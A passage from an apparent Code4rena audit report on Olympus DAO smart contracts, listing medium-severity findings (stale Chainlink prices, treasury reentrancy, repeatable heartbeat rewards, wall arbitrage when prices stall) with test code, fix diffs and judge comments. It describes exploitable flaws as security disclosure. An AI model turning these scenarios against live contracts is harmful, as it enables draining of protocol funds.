10000\n        /// when the lower market should be deployed the operate reverts\n        price.setLastPrice(20 * 1e18);\n\n        /// Trigger the operate function manually\n        /// The operate will revert Error with \"Division or modulo by 0\"\n        /// But I could not figure out to catch with `expectRevert`\n        /// so just commenting out the assert\n        // vm.prank(guardian);\n        // /// vm.expectRevert(bytes(\"Division or module by 0\"));   // this cannot catch the revert...\n        // operator.operate();\n    }\n```\n\n### Cause\n\nThe main cause is that the `RANGE::setSpreads` function fails to check for `wallSpread_ == 10000`. If the setter does not allow the wallSpread to be 100%, the price of the lower wall will not go to zero.\n\n```solidity\n// modules/RANGE.sol\n// https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L242-L250\n\n242     function setSpreads(uint256 cushionSpread_, uint256 wallSpread_) external permissioned {\n243         // Confirm spreads are within allowed values\n244         if (\n245             wallSpread_ > 10000 ||\n246             wallSpread_ < 100 ||\n247             cushionSpread_ > 10000 ||\n248             cushionSpread_ < 100 ||\n249             cushionSpread_ > wallSpread_\n250         ) revert RANGE_InvalidParams();\n```\n\nIn the `RANGE::updatePrices`, the price of lower wall will be zero if the wallSpread is 100%.\nIf the price of lower wall is zero, the `Operator::_activate` will fail for the lower cushion.\n\n```solidity\n// policies/Operator.sol::_activate(bool high_)\n// when high_ is false\n421             uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;\n\n// modules/RANGE.sol::updatePrices\n164         _range.wall.low.price = (movingAverage_ * (FACTOR_SCALE - wallSpread)) / FACTOR_SCALE;\n```\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nMitigation suggestion: line 245. Forbid wallSpread to be 100%.\n\n```solidity\n// modules/RANGE.sol\n// https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L242-L250\n\n242     function setSpreads(uint256 cushionSpread_, uint256 wallSpread_) external permissioned {\n243         // Confirm spreads are within allowed values\n244         if (\n-245            wallSpread_ > 10000 ||\n+               wallSpread_ >= 10000 ||\n246             wallSpread_ < 100 ||\n247             cushionSpread_ > 10000 ||\n248             cushionSpread_ < 100 ||\n249             cushionSpread_ > wallSpread_\n250         ) revert RANGE_InvalidParams();\n```\n\n**[Oighty (Olympus) disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/404#issuecomment-1238554404):**\n > This is indeed an edge case and we will update the value checks for the spread values to exclude `10000`. However, from a practical perspective, this is very unlikely to happen. If the goal is to set the lower wall to 0, then the system would just be disabled.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/404#issuecomment-1251657272):**\n > Given the warden does fully demonstrate the issue, I am going to award as Medium with the understanding that this is an extreme edge case. \n\n\n\n***\n\n## [[M-21] OlympusGovernance - active proposal does not expire](https://github.com/code-423n4/2022-08-olympus-findings/issues/100)\n_Submitted by reassor_\n\nContract `OlympusGovernance` allows controlling protocol through on-chain governing. The issue is that once proposal is active it does not expire, which means that until the new proposal will be selected, anyone can vote on existing one and potentially execute it when it might cause harm to the protocol.\n\nScenario:\n\n1.  New proposal has been submited, endorsed and activated.\n2.  Users vote, but the quroum is not being achieved.\n3.  The proposal is active until new one is getting submitted.\n4.  6 months elapses and the current active proposal might cause serious harm to the protocol (since it was created long time ago).\n5.  Malicious actor votes and executes proposal causing harm to the protocol.\n\n### Proof of Concept\n\n`Governance.sol`:\n\n*   <https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L265-L289>\n\n### Tools Used\n\nManual Review / VSCode\n\n### Recommended Mitigation Steps\n\nIt is recommended to add expiration for the active proposal for example 2 weeks. After that time it should be possible to reject proposal and users should be able to reclaim VOTES tokens.\n\n**[fullyallocated (Olympus) disputed](https://github.com/code-423n4/2022-08-olympus-findings/issues/100)**\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/100#issuecomment-1251712619):**\n > I believe the warden is simply stating that an active proposal stays active if not replaced.  There is not expiration of a proposal once it becomes active, so theoretically if the governance process is inactive a very stale proposal could get executed. \n\n\n\n***\n\n## [[M-22] Low market bonds/swaps not working after loan is taken from treasury](https://github.com/code-423n4/2022-08-olympus-findings/issues/422)\n_Submitted by immeas_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L60><br>\n\nI am bordering between this being medium and low, but since this is, granted under very unlikely circumstances, hindering intended transfers to work I am submitting it as medium. That said, I don't think this scenario is very likely since it requires a trusted contract not part of initial release(? no contract in repo used a loan) to take a large loan from TRSRY.\n\n### Proof of Concept\n\nThis will cause test to fail on `TRANSFER_FAILED` due to TRSRY not having the tokens to transfer but `getReserveBalance` says it has, since capacity is determined based on non-existing tokens.\n\n```diff\ndiff --git a/src/test/policies/Operator.t.sol b/src/test/policies/Operator.t.sol\nindex e09aec1..5c1e95f 100644\n--- a/src/test/policies/Operator.t.sol\n+++ b/src/test/policies/Operator.t.sol\n@@ -26,6 +26,8 @@ import {OlympusMinter, OHM} from \"modules/MINTR.sol\";\n import {Operator} from \"policies/Operator.sol\";\n import {BondCallback} from \"policies/BondCallback.sol\";\n \n+import {ModuleTestFixtureGenerator} from \"test/lib/ModuleTestFixtureGenerator.sol\";\n+\n contract MockOhm is ERC20 {\n     constructor(\n         string memory _name,\n@@ -45,6 +47,7 @@ contract MockOhm is ERC20 {\n // solhint-disable-next-line max-states-count\n contract OperatorTest is Test {\n     using FullMath for uint256;\n+    using ModuleTestFixtureGenerator for OlympusTreasury;\n \n     UserFactory public userCreator;\n     address internal alice;\n@@ -53,6 +56,9 @@ contract OperatorTest is Test {\n     address internal policy;\n     address internal heart;\n \n+    address public debtor;\n+    address public godmode; \n+\n     RolesAuthority internal auth;\n     BondAggregator internal aggregator;\n     BondFixedTermTeller internal teller;\n@@ -187,6 +193,18 @@ contract OperatorTest is Test {\n \n         reserve.mint(address(treasury), testReserve * 100);\n \n+        debtor = treasury.generateFunctionFixture(treasury.getLoan.selector);\n+        godmode = treasury.generateGodmodeFixture(type(OlympusTreasury).name);\n+        \n+        kernel.executeAction(Actions.ActivatePolicy, godmode);\n+        kernel.executeAction(Actions.ActivatePolicy, debtor);\n+        \n+        vm.prank(godmode);\n+        treasury.setApprovalFor(debtor, reserve, testReserve * 100);\n+\n+        vm.prank(debtor);\n+        treasury.getLoan(reserve,testReserve*100);\n+\n         // Approve the operator and bond teller for the tokens to swap\n         vm.prank(alice);\n         ohm.approve(address(operator), testOhm * 20);\n```\n\nSame is applicable for low market bonds since they are created based on the same capacity.\n\n### Tools Used\n\nvs code + tests\n\n### Recommended Mitigation Steps\n\nDetermine capacity from actual tokens held by treasury.\n\n**[ind-igo (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/422#issuecomment-1238768525):**\n > Acknowledged. Will add a reserve requirement check inside the TRSRY's debt functions, which we can expand with a policy to rebalance if out of balance on a heartbeat.\n\n\n\n***\n\n## [[M-23] Treasury module is vulnerable to cross-contract reentrancy](https://github.com/code-423n4/2022-08-olympus-findings/issues/426)\n_Submitted by Czar102_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L108-L112><br>\n\nAn attacker can pay back their loan to the treasury module with protocol-owned tokens. This will cause their loan to decrease despite the protocol won't be given funds for it.\n\n### Proof of Concept\n\nThe code first measures the number of tokens in the treasury, then transfers an amount to the contract and checks the change it caused. This is put behind a nonReentrant modifier so that one can't use the same balance change to pay back multiple parts of (potentially) multiple loans.\n\nThe problem arises when the treasury doesn't only claim tokens from paying back loans, but also claims protocol revenue. Since, an attacker can gain execution in the moment the funds are pulled to the treasury to trigger any function that grants treasury this type of tokens (collects protocol revenue). The contract will count these tokens as paying back one's loan since this happened between balance measurements.\n\n### Recommended Mitigation Steps\n\nAdd a function used to pull a token to the contract and mark it nonReentrant. Any transfer of tokens to the treasury should be done through that function.\n\n**[ind-igo (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/426#issuecomment-1240219578):**\n > I am confused by this submission. Need more information.\n\n**[ind-igo (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/426#issuecomment-1244569278):**\n > Spoke with Czar, solution for minimal change is adding `received = min(received, amount_); `. Confirming issue.\n\n\n\n***\n\n## [[M-24] [NAZ-M1] Chainlink's `latestRoundData` Might Return Stale Results](https://github.com/code-423n4/2022-08-olympus-findings/issues/441)\n_Submitted by 0xNazgul, also found by &#95;&#95;141345&#95;&#95;, 0x1f8b, ak1, brgltd, cccz, csanuragjain, Dravee, Guardian, hyh, IllIllI, itsmeSTYJ, Jujic, Lambda, pashov, peachtea, rbserver, reassor, Sm4rty, TomJ, and zzzitron_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L161><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L170><br>\n\nAcross these contracts, you are using Chainlink's `latestRoundData` API, but there is only a check on `updatedAt`. This could lead to stale prices according to the Chainlink documentation:\n\n*   [Historical Price data](https://docs.chain.link/docs/historical-price-data/#historical-rounds)\n*   [Checking Your returned answers](https://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round)\n\nThe result of `latestRoundData` API will be used across various functions, therefore, a stale price from Chainlink can lead to loss of funds to end-users.\n\n### Recommended Mitigation Steps\n\nConsider adding the missing checks for stale data.\n\nFor example:\n\n```js\n(uint80 roundID ,answer,, uint256 timestamp, uint80 answeredInRound) = AggregatorV3Interface(chainLinkAggregatorMap[underlying]).latestRoundData();\n\nrequire(answer > 0, \"Chainlink price <= 0\"); \nrequire(answeredInRound >= roundID, \"Stale price\");\nrequire(timestamp != 0, \"Round not complete\");\n```\n\n**[Oighty (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/441#issuecomment-1238528515):**\n > Agree. We'll add the additional checks.\n\n\n\n***\n\n## [[M-25] Moving average precision is lost](https://github.com/code-423n4/2022-08-olympus-findings/issues/483)\n_Submitted by hyh, also found by CertoraInc, d3e4, and rbserver_\n\nNow the precision is lost in moving average calculations as the difference is calculated separately and added each time, while it typically can be small enough to lose precision in the division involved.\n\nFor example, `10000` moves of `990` size, `numObservations = 1000`. This will yield `0` on each update, while must yield `9900` increase in the moving average.\n\n### Proof of Concept\n\nMoving average is calculated with the addition of the difference:\n\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L134-L139>\n\n```solidity\n        // Calculate new moving average\n        if (currentPrice > earliestPrice) {\n            _movingAverage += (currentPrice - earliestPrice) / numObs;\n        } else {\n            _movingAverage -= (earliestPrice - currentPrice) / numObs;\n        }\n```\n\n`/ numObs` can lose precision as `currentPrice - earliestPrice` is usually small.\n\nIt is returned on request as is:\n\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193>\n\n```solidity\n    /// @notice Get the moving average of OHM in the Reserve asset over the defined window (see movingAverageDuration and observationFrequency).\n    function getMovingAverage() external view returns (uint256) {\n        if (!initialized) revert Price_NotInitialized();\n        return _movingAverage;\n    }\n```\n\n### Recommended Mitigation Steps\n\nConsider storing the cumulative `sum`, while returning `sum / numObs` on request:\n\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193>\n\n```solidity\n    /// @notice Get the moving average of OHM in the Reserve asset over the defined window (see movingAverageDuration and observationFrequency).\n    function getMovingAverage() external view returns (uint256) {\n        if (!initialized) revert Price_NotInitialized();\n-       return _movingAverage;\n+       return _movingAverage / numObservations;\n    }\n```\n\n**[Oighty (Olympus) disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/483#issuecomment-1238433469):**\n > Keeping track of the observations as a sum and then dividing is a good suggestion. The price values have 18 decimals and the max discrepancy introduced is very small (10**-15) with expected parameter ranges. The potential risk to the protocol seems low though.\n\n**[hyh (warden) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/483#issuecomment-1240994248):**\n > Please notice that discrepancy here is unbounded, i.e. the logic itself does not have any max discrepancy, the divergence between fact and recorded value can pile up over time without a limit.\n> \n> If you do imply that markets should behave in some way that minuses be matched with pluses, then I must say that they really shouldn't.\n\n**[Oighty (Olympus) confirmed](https://github.com/code-423n4/2022-08-olympus-findings/issues/483)**\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/483#issuecomment-1249930031):**\n > Debating between QA and Medium on this one. I am going to award it as medium because there is a potential to leak some value due to this imprecision compounding over time. \n\n\n\n***\n\n## [[M-26] Cushion bond markets are opened at wall price rather than current price](https://github.com/code-423n4/2022-08-olympus-findings/issues/485)\n_Submitted by 0x52_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L363-L469><br>\n\nIncorrect initial bond market price.\n\n### Proof of Concept\n\n    uint256 initialPrice = range.wall.high.price.mulDiv(bondScale, oracleScale);\n\n    uint256 initialPrice = invWallPrice.mulDiv(bondScale, oracleScale);\n\nIn the above lines the initial prices are set to the wall price rather than the current price as indicated in documentation.\n\n### Recommended Mitigation Steps\n\nInitial price should be updated to open bond market at current price rather than wall price.\n\n**[Oighty (Olympus) disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/485#issuecomment-1235667143):**\n > This is more of a design decision than a bug. However, we did make this change in the code prior to the audit (it didn't get reflected in the repo). @ind-igo not sure how you want to handle.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/485#issuecomment-1251683341):**\n > Going to award as Medium assuming no additional input from sponsor on the topic. \n\n**[Oighty (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/485#issuecomment-1252616779):**\n > It does deviate from the spec so I guess that's appropriate. The system actually would work as-is, but would be less responsive to price movements into the cushions since the bond market would have to decay (which requires waiting) to reach the current market price vs. instantly providing a buy/sell at the current price.\n\n\n\n***\n\n## [[M-27] Unexecutable proposals when `Actions.MigrateKernel` is not last instruction](https://github.com/code-423n4/2022-08-olympus-findings/issues/51)\n_Submitted by Lambda_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/INSTR.sol#L61><br>\n\nIn `INSTR.sol`, it is correctly checked that a `ChangeExecutor` instruction only occurs at the last position to avoid situations where the other instructions are deemed as invalid.<br>\nHowever, the same problem can occur for `MigrateKernel`. For instance, let's say we have a `MigrateKernel` followed by a `DeactivatePolicy` action. The `MigrateKernel` action will change the value of `kernel` within the policy. The `DeactivatePolicy` action tries to call `setActiveStatus` on the policy. However, this has a `onlyKernel` modifier and the call will therefore fail when it is done after the value of `kernel` was changed.\n\n### Recommended Mitigation Steps\n\nPerform the same check for `MigrateKernel`.\n\n**[fullyallocated (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/51#issuecomment-1236245145):**\n > Thank you; good catch\n\n\n\n***\n\n## [[M-28] Activating same Policy multiple times in Kernel possible](https://github.com/code-423n4/2022-08-olympus-findings/issues/52)\n_Submitted by Lambda, also found by enckrish_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L296><br>\n\nTo check that an already active policy is not added a second time, `isActive()` is called on the policy. However, `policy` could be a malicious contract that always returns `false` for `isActive()`. In such a scenario, it would be possible to activate the policy multiple times for the same Kernel. This would break uniqueness invariants such that `_deactivatePolicy()` no longer works. However, it could also be used for a DoS attack: As `_reconfigurePolicies` and `_migrateKernel` iterate over those lists that now contain duplicates, they could run out of gas if a policy is activated enough times.\n\n### Recommended Mitigation Steps\n\nCheck `getPolicyIndex[policy_] != 0` instead of relying on a value of an untrusted contract.\n\n**[0xLienid (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/52#issuecomment-1238281166):**\n > @ind-igo a few other submissions also mention problems with over-reliance on policy.isActive (i.e. [#368](https://github.com/code-423n4/2022-08-olympus-findings/issues/368)). Might be worth mitigating with the suggested step here or the check on activePolicies[index] like 368 mentions.\n\n**[ind-igo (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/52#issuecomment-1241161485):**\n > Dupe of #368 \n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/52#issuecomment-1251630127):**\n > I think this is separate from #368 which is about a policy deactivating that isn't already active. \n> \n> I am a bit skeptical at the impact statement currently, but it does seem like protocol functionality does end up in a bad state with the typical policy lifecycle here. Will award as Medium unless Sponsor wants to provide some additional reasoning as to a downgrade. \n\n**[ind-igo (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/52#issuecomment-1271829178):**\n > While the issue is slightly different from #368, the solution is the exact same. The remediation has the new checks to prevent both of these issues.\n\n\n\n***\n\n## [[M-29] TRSRY susceptible to loan / withdraw confusion](https://github.com/code-423n4/2022-08-olympus-findings/issues/75)\n_Submitted by Trust, also found by 0xSky, datapunk, and tonisives_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L64-L102><br>\n\nTreasury allocates approvals in the withdrawApproval mapping which is set via setApprovalFor(). In both withdrawReserves() and in getLoan(), \\_checkApproval() is used to verify user has enough approval and subtracts the withdraw / loan amount. Therefore, there is no differentiation in validation between loan approval and withdraw approval. Policies which will use getLoan() (currently none) can simply withdraw the tokens without bookkeeping it as a loan.\n\n### Proof of Concept\n\n1.  Policy P has getLoan permission\n2.  setApprovalFor(policy, token, amount) was called to grant P permission to loan amount\n3.  P calls withdrawReserves(address, token, amount) and directly withdraws the funds without registering as loan\n\n### Recommended Mitigation Steps\n\nA separate mapping called loanApproval should be implemented, and setLoanApprovalFor() will set it, getLoan() will reduce loanApproval balance.\n\n**[ind-igo (Olympus) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/75#issuecomment-1239657706):**\n > Confirmed. Good suggestion. Would put as low risk though.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/75#issuecomment-1250396074):**\n > Currently thinking Medium is appropriate for this issue, but will circle back on it. \n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/75#issuecomment-1251404052):**\n > See [#293](https://github.com/code-423n4/2022-08-olympus-findings/issues/293) for a possible vector in which this could lead to loss of funds.  Going to leave as Medium.\n\n\n\n***\n\n## [[M-30] `Heart::beat()` could be called several times in one block if no one called it for a some time](https://github.com/code-423n4/2022-08-olympus-findings/issues/79)\n_Submitted by rvierdiiev, also found by datapunk, devtooligan, itsmeSTYJ, Jeiwan, Lambda, Trust, and zzzitron_\n\n`beat()` function is allowed to be called by anyone once in `frequency()` period. The purpose of it is to update the prices and do another operations related to bond market. User who ran it are rewarded. There is no need to run this function more then 1 time in `frequency()` period.\nHowever if `beat()` was last time called more then `frequency()` time ago then user can execute `beat()` function `(block.timestamp - lastBeat)/frequency()` times in a row in same block and get rewards.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L92><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103>\n\n### Recommended Mitigation Steps\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103><br>\nChange this line to `lastBeat = block.timestamp - (block.timestamp - lastBeat) % frequency();`<br>\nSo no matter how much time the `beat()` was not called, it is possible to call it only once per `frequency()`.\n\n**[Oighty (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/79#issuecomment-1239882530):**\n > See comment on [#405](https://github.com/code-423n4/2022-08-olympus-findings/issues/405#issuecomment-1239878294). This approach actually solves both of our issues though.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/79#issuecomment-1251018524):**\n > Going to use this issue as the primary since the solution is elegant and solves the problem. \n\n\n\n***\n\n## [[M-31] Protocol's Walls / cushion bonds remain active even if heart is not beating](https://github.com/code-423n4/2022-08-olympus-findings/issues/89)\n_Submitted by Trust_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L188-L191><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L272><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L346><br>\n\nThe Walls of the RBS mechanism offer zero slippage swaps at the high and low of the moving average spread. The capacity to be swapped at these prices is usually very large, so it must make sure to only be enabled when the prices are guaranteed to be synced. However, there is no such check. If beat() is not called for some time, meaning we cannot determine if the current spread is legit, swap() still operates as usual.\n\n### Impact\n\nThe worst case scenario is that the wall is swapping at a losing price, meaning they can be immediately drained via arbitrage bot.\n\n### Proof of concept\n\n    1. Price is X at the start\n    2. Oracle stops updating for some reason / no one calls beat()\n    3. Price drops to Y , where Y < low wall centered around X\n    4. Attacker can perform arbitrage by buying Ohm at external markets at Y and selling Ohm at low wall price, netting the difference.\n\n### Recommended mitigation steps:\n\nChange modifier onlyWhileActive to add a check for beat out of sync:\n\n    if (block.timestamp > lastBeat + SYNC_THRESHOLD * frequency())\n\n**[Oighty (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/89#issuecomment-1238784898):**\n > This is an interesting unintended consequence of a bad price feed or other `beat()` issue. Your suggested update makes sense, but we will probably adjust slightly to only manage the bad data threshold in one place. \n> \n> After originally looking at it, I thought a try/catch block on the external call to `PRICE.getLastPrice()` in `Operator.operate()` would work, but it doesn't handle cases where `operate()` isn't reached by the `beat()` function.\n\n\n\n***\n\n## [[M-32] Admin cannot be changed to EOA after deployment](https://github.com/code-423n4/2022-08-olympus-findings/issues/94)\n_Submitted by Jeiwan, also found by datapunk_\n\nAfter contracts are deployed and initialized, the admin address in `Kernel` contract can only be set to a contract. Granting and revoking roles will be possible to do only via a contract, which looks like an unintended behavior since these operations cannot be performed via governance (the governance contract is designed to be the only executor).\n\n### Proof of Concept\n\nAdmin address can be changed to any address (EOA or contract) in the `executeAction` function in `Kernel`:<br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L252-L253>\n\nThis piece explicitly allows EOA addresses since the other actions in the function (besides `ChangeExecutor`) are checked to have only a contract as the target (see `ensureContract` function calls in the other actions). This, and the fact that roles cannot be managed via governance, leads to the conclusion that an admin is designed to be an EOA.\n\nHowever, in the `store` function in `INSTR`, action target can only be a contract:<br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L52>\n\nAfter the contracts are deployed, `INSTR` will be the only contract that's allowed to call `Kernel.executeAction`:<br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/scripts/Deploy.sol#L220>\n\nThus, there will be no way to change admin to an EOA. If admin needs to be an EOA, the `INSTR` contract needs to be patched and re-deployed to allow non-contract targets.\n\n### Recommended Mitigation Steps\n\nAllow EOA addresses as instruction targets or disallow non-contract admin addresses.\n\n**[fullyallocated (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/94#issuecomment-1234801408):**\n > Nice find + writeup.\n\n\n\n***\n\n# Low Risk and Non-Critical Issues\n\nFor this contest, 114 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2022-08-olympus-findings/issues/415) by **zzzitron** received the top score from the judge.\n\n*The following wardens also submitted reports: [c3phas](https://github.com/code-423n4/2022-08-olympus-findings/issues/450), [hyh](https://github.com/code-423n4/2022-08-olympus-findings/issues/500), [0xNazgul](https://github.com/code-423n4/2022-08-olympus-findings/issues/440), [0xNineDec](https://github.com/code-423n4/2022-08-olympus-findings/issues/166), [Jeiwan](https://github.com/code-423n4/2022-08-olympus-findings/issues/27), [Deivitto](https://github.com/code-423n4/2022-08-olympus-findings/issues/472), [Bahurum](https://github.com/code-423n4/2022-08-olympus-findings/issues/496), [cccz](https://github.com/code-423n4/2022-08-olympus-findings/issues/242), [rbserver](https://github.com/code-423n4/2022-08-olympus-findings/issues/457), [mics](https://github.com/code-423n4/2022-08-olympus-findings/issues/163), [Aymen0909](https://github.com/code-423n4/2022-08-olympus-findings/issues/452), [Rolezn](https://github.com/code-423n4/2022-08-olympus-findings/issues/195), [reassor](https://github.com/code-423n4/2022-08-olympus-findings/issues/169), [ignacio](https://github.com/code-423n4/2022-08-olympus-findings/issues/168), [oyc&#95;109](https://github.com/code-423n4/2022-08-olympus-findings/issues/7), [0xDjango](https://github.com/code-423n4/2022-08-olympus-findings/issues/217), [0xSmartContract](https://github.com/code-423n4/2022-08-olympus-findings/issues/250), [shenwilly](https://github.com/code-423n4/2022-08-olympus-findings/issues/199), [rvierdiiev](https://github.com/code-423n4/2022-08-olympus-findings/issues/151), [Sm4rty](https://github.com/code-423n4/2022-08-olympus-findings/issues/233), [ReyAdmirado](https://github.com/code-423n4/2022-08-olympus-findings/issues/45), [Bnke0x0](https://github.com/code-423n4/2022-08-olympus-findings/issues/28), [Tomo](https://github.com/code-423n4/2022-08-olympus-findings/issues/148), [gogo](https://github.com/code-423n4/2022-08-olympus-findings/issues/155), [robee](https://github.com/code-423n4/2022-08-olympus-findings/issues/17), [fatherOfBlocks](https://github.com/code-423n4/2022-08-olympus-findings/issues/22), [ladboy233](https://github.com/code-423n4/2022-08-olympus-findings/issues/34), [erictee](https://github.com/code-423n4/2022-08-olympus-findings/issues/8), [ElKu](https://github.com/code-423n4/2022-08-olympus-findings/issues/131), [cRat1st0s](https://github.com/code-423n4/2022-08-olympus-findings/issues/47), [GalloDaSballo](https://github.com/code-423n4/2022-08-olympus-findings/issues/374), [Lambda](https://github.com/code-423n4/2022-08-olympus-findings/issues/49), [lukris02](https://github.com/code-423n4/2022-08-olympus-findings/issues/316), [tonisives](https://github.com/code-423n4/2022-08-olympus-findings/issues/305), [Ruhum](https://github.com/code-423n4/2022-08-olympus-findings/issues/138), [durianSausage](https://github.com/code-423n4/2022-08-olympus-findings/issues/30), [dipp](https://github.com/code-423n4/2022-08-olympus-findings/issues/396), [sikorico](https://github.com/code-423n4/2022-08-olympus-findings/issues/162), [IllIllI](https://github.com/code-423n4/2022-08-olympus-findings/issues/268), [0xSky](https://github.com/code-423n4/2022-08-olympus-findings/issues/473), [pfapostol](https://github.com/code-423n4/2022-08-olympus-findings/issues/261), [Rohan16](https://github.com/code-423n4/2022-08-olympus-findings/issues/360), [DimSon](https://github.com/code-423n4/2022-08-olympus-findings/issues/297), [RaymondFam](https://github.com/code-423n4/2022-08-olympus-findings/issues/66), [Waze](https://github.com/code-423n4/2022-08-olympus-findings/issues/311), [devtooligan](https://github.com/code-423n4/2022-08-olympus-findings/issues/400), [0x1f8b](https://github.com/code-423n4/2022-08-olympus-findings/issues/372), [nxrblsrpr](https://github.com/code-423n4/2022-08-olympus-findings/issues/357), [brgltd](https://github.com/code-423n4/2022-08-olympus-findings/issues/499), [delfin454000](https://github.com/code-423n4/2022-08-olympus-findings/issues/363), [BipinSah](https://github.com/code-423n4/2022-08-olympus-findings/issues/356), [bobirichman](https://github.com/code-423n4/2022-08-olympus-findings/issues/165), [datapunk](https://github.com/code-423n4/2022-08-olympus-findings/issues/115), [TomJ](https://github.com/code-423n4/2022-08-olympus-findings/issues/321), [martin](https://github.com/code-423n4/2022-08-olympus-findings/issues/191), [Ch&#95;301](https://github.com/code-423n4/2022-08-olympus-findings/issues/353), [Chandr](https://github.com/code-423n4/2022-08-olympus-findings/issues/284), [ajtra](https://github.com/code-423n4/2022-08-olympus-findings/issues/460), [prasantgupta52](https://github.com/code-423n4/2022-08-olympus-findings/issues/373), [tnevler](https://github.com/code-423n4/2022-08-olympus-findings/issues/387), [rokinot](https://github.com/code-423n4/2022-08-olympus-findings/issues/466), [Guardian](https://github.com/code-423n4/2022-08-olympus-findings/issues/183), [w0Lfrum](https://github.com/code-423n4/2022-08-olympus-findings/issues/72), [CertoraInc](https://github.com/code-423n4/2022-08-olympus-findings/issues/228), [aviggiano](https://github.com/code-423n4/2022-08-olympus-findings/issues/32), [rajatbeladiya](https://github.com/code-423n4/2022-08-olympus-findings/issues/216), [yixxas](https://github.com/code-423n4/2022-08-olympus-findings/issues/260), [&#95;&#95;141345&#95;&#95;](https://github.com/code-423n4/2022-08-olympus-findings/issues/280), [csanuragjain](https://github.com/code-423n4/2022-08-olympus-findings/issues/326), [ak1](https://github.com/code-423n4/2022-08-olympus-findings/issues/364), [cryptphi](https://github.com/code-423n4/2022-08-olympus-findings/issues/423), [The&#95;GUILD](https://github.com/code-423n4/2022-08-olympus-findings/issues/320), [0x52](https://github.com/code-423n4/2022-08-olympus-findings/issues/116), [carlitox477](https://github.com/code-423n4/2022-08-olympus-findings/issues/129), [ch13fd357r0y3r](https://github.com/code-423n4/2022-08-olympus-findings/issues/14), [sorrynotsorry](https://github.com/code-423n4/2022-08-olympus-findings/issues/238), [PPrieditis](https://github.com/code-423n4/2022-08-olympus-findings/issues/307), [PwnPatrol](https://github.com/code-423n4/2022-08-olympus-findings/issues/389), [Chom](https://github.com/code-423n4/2022-08-olympus-findings/issues/433), [eierina](https://github.com/code-423n4/2022-08-olympus-findings/issues/495), [CodingNameKiki](https://github.com/code-423n4/2022-08-olympus-findings/issues/197), [StevenL](https://github.com/code-423n4/2022-08-olympus-findings/issues/448), [bin2chen](https://github.com/code-423n4/2022-08-olympus-findings/issues/204), 